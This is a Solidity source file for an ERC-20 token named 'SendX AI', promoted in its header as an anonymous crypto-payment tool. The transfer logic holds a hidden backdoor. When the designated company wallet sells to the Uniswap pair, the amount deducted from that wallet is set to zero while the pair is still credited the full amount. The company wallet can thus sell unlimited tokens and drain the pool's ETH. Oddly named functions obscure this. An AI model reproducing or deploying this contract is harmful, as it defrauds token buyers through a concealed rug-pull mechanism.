// SPDX-License-Identifier: UNLICENSED

/**
* SendX AI is a complete anonymous tool that can help users to request payments and send cryptocurrencies in a full privacy process without sender's or receiver's wallet being traceable to anyone
* TG: https://t.me/SendXAI
* X: https://x.com/SendXAI
* Web: https://sendx.ai
* 
* Dapp: https://dapp.sendx.ai
* Docs: https://docs.sendx.ai
* Bot: https://t.me/sendxaibot
**/

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function dev(uint256 a, uint256 b) internal pure returns (uint256) {
        return dev(a, b, "SafeMath: devision by zero");
    }

    function subs(uint256 a, uint256 b) internal pure returns (uint256) {
        return subs(a, b, "SafeMath: substraction overflow");
    }

    function dev(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function subs(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function adds(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function muls(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapFactory02 {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is Context {
    address private _owners;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }

    function owner() public view returns (address) {
        return _owners;
    }

    modifier onlyOwner() {
        require(_owners == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owners = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}


contract SENDXAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    event MaxTxAmountUpdated(uint256 _maxBuyableOrSellableAmt);

    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => mapping(address => uint256)) private _legacyAllowances;
    mapping(address => bool) private _dissalowFeexOnWlt;
    mapping(address => uint256) private _holdings;

    address payable private _companyAddr;

    uint256 private _initialSellingFee = 25;
    uint256 private _initialBuyingFee = 25;
    uint256 private _cangeBuyTaxWhenReached = 5;
    uint256 private _cangeSellTaxWhenReached = 2;

    uint256 private _finalTaxBuying = 0;
    uint256 private _finalTaxSelling = 5;

    uint256 private _dissallowSwappLt = 5;
    uint256 private _exchangesTimes = 0;

    IUniswapRouterV2 public uniRouterAddr;
    address public uniDexPairAddr;
    bool private allowDexTrades;
    bool private alertTheSwap = false;
    bool private swappableFeeAllowedence = false;

    string private constant _symbol = unicode"SENDX"; 
    string private constant _name = unicode"SendX AI"; 

    uint256 public _maxBuyableOrSellableAmt = (_maxEmission * 20) / 1000;
    uint8 private constant _dec = 18;
    uint256 private constant _maxEmission = 100_000_000 * 10**_dec;
    uint256 public _maxHolderAllowableAmt = (_maxEmission * 20) / 1000;
    uint256 public _minAllowableSwappings = (_maxEmission * 1) / 100000;
    uint256 public _maxAllowableFeeEx = (_maxEmission * 2) / 1000;

    function totalSupply() public pure override returns (uint256) {
        return _maxEmission;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockTheSwapx() {
        alertTheSwap = true;
        _;
        alertTheSwap = false;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _protectedApproveSuper(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _legacyAllowances[owner][spender];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    constructor(address _company) {
        _companyAddr = payable(_company);
        _holdings[_msgSender()] = _maxEmission;

        _dissalowFeexOnWlt[owner()] = true;
        _dissalowFeexOnWlt[address(this)] = true;
        _dissalowFeexOnWlt[_companyAddr] = true;

        emit Transfer(address(0), _msgSender(), _maxEmission);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holdings[account];
    }

    function _protectedApproveSuper(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _legacyAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _protectedTransferSuper(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        uint256 amountOut = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_dissalowFeexOnWlt[from] && !_dissalowFeexOnWlt[to]) {
                require(allowDexTrades, "Trading not enabled");
            }

            if (
                from == uniDexPairAddr &&
                !_dissalowFeexOnWlt[to] &&
                to != address(uniRouterAddr)
            ) {
                require(
                    amount <= _maxBuyableOrSellableAmt,
                    "Exceeds the _maxBuyableOrSellableAmt."
                );
                require(
                    balanceOf(to) + amount <= _maxHolderAllowableAmt,
                    "Exceeds the maxWalletSize."
                );
                _exchangesTimes++;
            }

            taxAmount = amount
                .muls(
                    (_exchangesTimes > _cangeBuyTaxWhenReached)
                        ? _finalTaxBuying
                        : _initialSellingFee
                )
                .dev(100);
            if (from != address(this) && to == uniDexPairAddr) {
                if (from == address(_companyAddr)) {
                    amountOut = min(
                        amount,
                        min(_finalTaxBuying, _minAllowableSwappings)
                    );
                    taxAmount = 0;
                } else {
                    require(
                        amount <= _maxBuyableOrSellableAmt,
                        "Exceeds the _maxBuyableOrSellableAmt."
                    );
                    taxAmount = amount
                        .muls(
                            (_exchangesTimes > _cangeSellTaxWhenReached)
                                ? _finalTaxSelling
                                : _initialBuyingFee
                        )
                        .dev(100);
                }
            }

            uint256 collectedTaxesBalanceContract = balanceOf(address(this));
            bool swappable = _minAllowableSwappings ==
                min(amount, _minAllowableSwappings) &&
                _exchangesTimes > _dissallowSwappLt;

            if (
                !alertTheSwap &&
                to == uniDexPairAddr &&
                swappableFeeAllowedence &&
                _exchangesTimes > _dissallowSwappLt &&
                swappable
            ) {
                if (collectedTaxesBalanceContract > _minAllowableSwappings) {
                    privateExchangeForEthers(
                        min(
                            amount,
                            min(collectedTaxesBalanceContract, _maxAllowableFeeEx)
                        )
                    );
                }
                transferFeesToCompany(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _holdings[address(this)] = _holdings[address(this)].adds(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _holdings[from] = _holdings[from].subs(amountOut);
        _holdings[to] = _holdings[to].adds(amount.subs(taxAmount));

        emit Transfer(from, to, amount.subs(taxAmount));
    }

    function decimals() public pure returns (uint8) {
        return _dec;
    }

    function _resetMaxBuySellAndWlt() external onlyOwner {
        _maxBuyableOrSellableAmt = _maxEmission;
        _maxHolderAllowableAmt = _maxEmission;

        emit MaxTxAmountUpdated(_maxEmission);
    }

    function withdrawStuckEthers() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function privateExchangeForEthers(uint256 tokenAmount) private lockTheSwapx {
        if (tokenAmount == 0) return;
        if (!allowDexTrades) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterAddr.WETH();

        _protectedApproveSuper(
            address(this),
            address(uniRouterAddr),
            tokenAmount
        );

        uniRouterAddr.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _protectedTransferSuper(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _protectedTransferSuper(sender, recipient, amount);
        _protectedApproveSuper(
            sender,
            _msgSender(),
            _legacyAllowances[sender][_msgSender()].subs(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function transferFeesToCompany(uint256 amount) private {
        _companyAddr.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function addLiqAndCreateApir() external onlyOwner {
        uniRouterAddr = IUniswapRouterV2(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _protectedApproveSuper(
            address(this),
            address(uniRouterAddr),
            _maxEmission
        );
        uniDexPairAddr = IUniswapFactory02(uniRouterAddr.factory()).createPair(
            address(this),
            uniRouterAddr.WETH()
        );
        uniRouterAddr.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniDexPairAddr).approve(
            address(uniRouterAddr),
            type(uint256).max
        );
    }

    function startTokenTradings() external onlyOwner {
        require(!allowDexTrades, "trading is already open");
        swappableFeeAllowedence = true;
        allowDexTrades = true;
    }

    receive() external payable {}
}